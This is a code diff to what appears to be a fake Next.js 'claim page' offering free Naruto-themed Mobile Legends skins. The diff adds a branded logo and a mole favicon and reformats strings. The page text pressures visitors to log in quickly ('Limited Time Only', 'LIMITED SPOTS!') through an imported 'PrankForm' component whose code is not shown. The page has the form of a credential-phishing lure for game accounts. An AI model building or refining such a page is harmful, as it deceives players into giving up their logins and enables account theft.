@@ -1,9 +1,10 @@
-"use client"; // This directive makes it a Client Component
+'use client'; // This directive makes it a Client Component
 
-import Head from "next/head"; // Still useful for setting page title
-import Image from "next/image"; // Let's use this for some flair!
-import { usePrankForm } from "@/app/hooks/usePrankForm"; // Assuming alias for hooks
-import { PrankFormComponent } from "@/app/components/PrankForm"; // Assuming alias for components
+import Head from 'next/head'; // Still useful for setting page title
+import Image from 'next/image'; // Let's use this for some flair!
+import { usePrankForm } from '@/app/hooks/usePrankForm'; // Assuming alias for hooks
+import { PrankFormComponent } from '@/app/components/PrankForm'; // Assuming alias for components
+import logo from '@/assets/logoMLxNARUTO.png';
 
 export default function ClaimPage() {
   const {
@@ -24,6 +25,7 @@ export default function ClaimPage() {
           name="description"
           content="Don't miss out! Log in to claim your FREE & EXCLUSIVE Naruto Series Skins for Mobile Legends - Limited Time Only!"
         />
+        <link rel="icon" href="/mole.svg" />
       </Head>
       {/* Main container with a more dynamic gradient background */}
       <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-orange-700 flex flex-col items-center justify-center p-4 text-white selection:bg-orange-500 selection:text-white">
@@ -33,19 +35,11 @@ export default function ClaimPage() {
           <div className="text-center mb-6 md:mb-8">
             <div className="flex justify-center items-center space-x-4 mb-4">
               <Image
-                src="https://placehold.co/100x100/FFFFFF/000000/png?text=MLBB+Logo&font=roboto" // Replace with actual MLBB logo
-                alt="Mobile Legends Logo"
-                width={60}
-                height={60}
+                src={logo} // Replace with actual MLBB logo
+                alt="MLBB X Naruto"
+                width={240}
+                height={240}
                 className="rounded-full"
-              />
-              <span className="text-4xl font-bold text-yellow-400">X</span>
-              <Image
-                src="https://placehold.co/100x100/FF9900/FFFFFF/png?text=Naruto+Logo&font=ninja" // Replace with actual Naruto logo
-                alt="Naruto Logo"
-                width={60}
-                height={60}
-                className="rounded-md"
               />
             </div>
             <h1 className="text-3xl md:text-4xl font-bold mb-2">
@@ -54,8 +48,8 @@ export default function ClaimPage() {
               </span>
             </h1>
             <p className="text-lg md:text-xl text-slate-300">
-              Log in to snag your{" "}
-              <span className="font-bold text-yellow-400">LEGENDARY</span>{" "}
+              Log in to snag your{' '}
+              <span className="font-bold text-yellow-400">LEGENDARY</span>{' '}
               Naruto Skins!
             </p>
           </div>
@@ -74,7 +68,8 @@ export default function ClaimPage() {
           {/* Footer Text */}
           <p className="mt-8 text-xs text-center text-slate-400 animate-pulse">
             ⚠️ <span className="font-semibold">LIMITED SPOTS!</span> This epic
-            event won't last forever. Claim your skins before they're gone! ⚠️
+            event won&apos;t last forever. Claim your skins before they&apos;re
+            gone! ⚠️
           </p>
         </div>
       </div>
